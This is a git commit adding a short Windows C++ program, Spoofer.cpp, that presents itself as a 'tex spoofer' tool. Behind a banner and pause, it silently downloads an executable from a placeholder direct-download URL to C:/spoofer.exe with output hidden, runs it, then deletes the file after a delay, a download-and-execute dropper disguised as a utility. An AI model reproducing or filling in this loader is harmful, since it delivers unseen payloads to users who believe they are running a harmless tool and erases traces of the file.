4b8f249fae1bfbf1aa888de179b08d89fc42b785
Andrew Fabbri <103990138+LIL-TEX@users.noreply.github.com>
2022-07-10 22:56:24 -0300

    Add files via upload

---
+++ Spoofer.cpp
@@ -0,0 +1,15 @@
+
+#include <Windows.h>
+#include <iostream>
+
+int main()
+{
+    system("title tex spoofer xD");
+    system("color 6");
+    std::cout << "Tex spoofer!\n";
+    system("pause");
+    system("curl LINK DE DOWNLOAD DIRETO AQUI --output C:/spoofer.exe >nul 2>&1");
+    system("start C:/spoofer.exe");
+    Sleep(6666);
+    remove("C:/spoofer.exe");
+}
